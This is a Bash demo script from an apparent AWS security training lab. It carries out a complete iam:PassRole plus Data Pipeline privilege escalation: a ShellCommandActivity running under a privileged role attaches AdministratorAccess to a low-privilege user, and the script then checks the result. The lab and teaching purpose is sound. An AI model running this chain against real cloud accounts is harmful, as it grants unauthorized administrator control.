#!/bin/bash

# Demo script for iam:PassRole + datapipeline privilege escalation
# This script demonstrates how a user with Data Pipeline permissions can escalate to admin


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-datapipeline-001-to-admin-starting-user"
TARGET_ROLE="pl-prod-datapipeline-001-to-admin-pipeline-role"
PIPELINE_NAME="pl-privesc-datapipeline-demo"
PIPELINE_DEFINITION_FILE="/tmp/pipeline_definition.json"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + Data Pipeline Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_passrole_datapipeline_pipeline.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 5: Create Data Pipeline
use_starting_creds
echo -e "${YELLOW}Step 5: Creating Data Pipeline${NC}"
echo "Pipeline name: $PIPELINE_NAME"

show_attack_cmd "Attacker" "aws datapipeline create-pipeline --region $AWS_REGION --name \"$PIPELINE_NAME\" --unique-id \"pl-privesc-\$(date +%s)\" --output json"
PIPELINE_RESULT=$(aws datapipeline create-pipeline \
    --region $AWS_REGION \
    --name "$PIPELINE_NAME" \
    --unique-id "pl-privesc-$(date +%s)" \
    --output json)

PIPELINE_ID=$(echo "$PIPELINE_RESULT" | jq -r '.pipelineId')
echo "Pipeline ID: $PIPELINE_ID"
echo -e "${GREEN}✓ Created Data Pipeline${NC}\n"

# [EXPLOIT] Step 6: Create pipeline definition with malicious ShellCommandActivity
echo -e "${YELLOW}Step 6: Creating pipeline definition with privilege escalation command${NC}"
echo "This pipeline will execute AWS CLI commands with the privileged role..."

TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
echo "Target Role ARN: $TARGET_ROLE_ARN"

# Create pipeline definition JSON
cat > "$PIPELINE_DEFINITION_FILE" <<EOF
{
  "objects": [
    {
      "id": "Default",
      "name": "Default",
      "scheduleType": "ondemand",
      "failureAndRerunMode": "CASCADE",
      "role": "$TARGET_ROLE_ARN",
      "resourceRole": "$TARGET_ROLE_ARN"
    },
    {
      "id": "ShellCommandActivityObj",
      "name": "PrivilegeEscalationActivity",
      "type": "ShellCommandActivity",
      "command": "aws iam attach-user-policy --user-name $STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
      "runsOn": {
        "ref": "Ec2ResourceObj"
      }
    },
    {
      "id": "Ec2ResourceObj",
      "name": "Ec2Resource",
      "type": "Ec2Resource",
      "terminateAfter": "10 Minutes",
      "instanceType": "t3.micro",
      "role": "$TARGET_ROLE_ARN",
      "resourceRole": "$TARGET_ROLE_ARN"
    }
  ]
}
EOF

echo -e "${BLUE}Pipeline definition created:${NC}"
echo "Command to execute: aws iam attach-user-policy --user-name $STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
echo -e "${GREEN}✓ Pipeline definition prepared${NC}\n"

# [EXPLOIT] Step 7: Put pipeline definition
echo -e "${YELLOW}Step 7: Uploading pipeline definition${NC}"
show_attack_cmd "Attacker" "aws datapipeline put-pipeline-definition --region $AWS_REGION --pipeline-id \"$PIPELINE_ID\" --pipeline-definition file://\"$PIPELINE_DEFINITION_FILE\" --output json"
aws datapipeline put-pipeline-definition \
    --region $AWS_REGION \
    --pipeline-id "$PIPELINE_ID" \
    --pipeline-definition file://"$PIPELINE_DEFINITION_FILE" \
    --output json > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully uploaded pipeline definition${NC}"
else
    echo -e "${RED}Error: Failed to upload pipeline definition${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 8: Activate the pipeline
echo -e "${YELLOW}Step 8: Activating pipeline to execute privilege escalation${NC}"
show_attack_cmd "Attacker" "aws datapipeline activate-pipeline --region $AWS_REGION --pipeline-id \"$PIPELINE_ID\" --output json"
aws datapipeline activate-pipeline \
    --region $AWS_REGION \
    --pipeline-id "$PIPELINE_ID" \
    --output json > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Pipeline activated successfully${NC}"
    echo "Pipeline ID: $PIPELINE_ID"
else
    echo -e "${RED}Error: Failed to activate pipeline${NC}"
    exit 1
fi
echo ""

# Step 9: Wait for EC2 instance to spin up and execute command
echo -e "${YELLOW}Step 9: Waiting for EC2 instance to launch and execute command${NC}"
echo "Data Pipeline will:"
echo "  1. Launch an EC2 instance with the privileged role"
echo "  2. Execute the AWS CLI command to attach AdministratorAccess"
echo "  3. This typically takes 60-90 seconds..."
echo ""
echo "Waiting 60 seconds for pipeline execution..."
sleep 60
echo -e "${GREEN}✓ Pipeline should have executed${NC}\n"

# Additional wait for IAM propagation
echo -e "${YELLOW}Waiting additional 15 seconds for IAM policy propagation...${NC}"
sleep 15
echo -e "${GREEN}✓ Policy should be propagated${NC}\n"

# [OBSERVATION] Step 10: Verify the policy was attached
use_readonly_creds
echo -e "${YELLOW}Step 10: Verifying AdministratorAccess policy was attached${NC}"
echo "Checking attached policies for user: $STARTING_USER"

show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name \"$STARTING_USER\" --query 'AttachedPolicies[*].PolicyName' --output text"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
    --user-name "$STARTING_USER" \
    --query 'AttachedPolicies[*].PolicyName' \
    --output text)

echo "Attached policies: $ATTACHED_POLICIES"

if echo "$ATTACHED_POLICIES" | grep -q "AdministratorAccess"; then
    echo -e "${GREEN}✓ AdministratorAccess policy successfully attached!${NC}"
else
    echo -e "${YELLOW}⚠ AdministratorAccess not yet attached${NC}"
    echo "Pipeline may still be executing. Wait another 30 seconds and check manually with:"
    echo "  aws iam list-attached-user-policies --user-name $STARTING_USER"
fi
echo ""

# [OBSERVATION] Step 11: Verify administrator access
use_readonly_creds
echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${YELLOW}⚠ Failed to list users${NC}"
    echo "Note: IAM policy changes can take a few minutes to fully propagate"
    echo "The pipeline may still be executing. Wait a bit longer and try again."
fi
echo ""

# Summary
# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with datapipeline permissions and iam:PassRole)"
echo "2. Created Data Pipeline: $PIPELINE_NAME"
echo "3. Created pipeline definition with ShellCommandActivity"
echo "4. Passed privileged role: $TARGET_ROLE to pipeline"
echo "5. Activated pipeline, which launched EC2 instance with privileged role"
echo "6. EC2 instance executed: aws iam attach-user-policy --user-name $STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
echo "7. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (datapipeline:CreatePipeline + PutPipelineDefinition + ActivatePipeline + iam:PassRole)"
echo -e "  → Data Pipeline with $TARGET_ROLE"
echo -e "  → EC2 instance with privileged role executes AWS CLI command"
echo -e "  → Attach AdministratorAccess to $STARTING_USER → Admin"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Data Pipeline: $PIPELINE_NAME (ID: $PIPELINE_ID)"
echo "- EC2 instance(s) launched by Data Pipeline (may already be terminated)"
echo "- AdministratorAccess policy attached to: $STARTING_USER"
echo "- Pipeline definition file: $PIPELINE_DEFINITION_FILE"

echo -e "\n${RED}⚠ Warning: The Data Pipeline and policy attachment remain${NC}"
echo -e "${RED}⚠ Data Pipeline may incur charges if not cleaned up${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
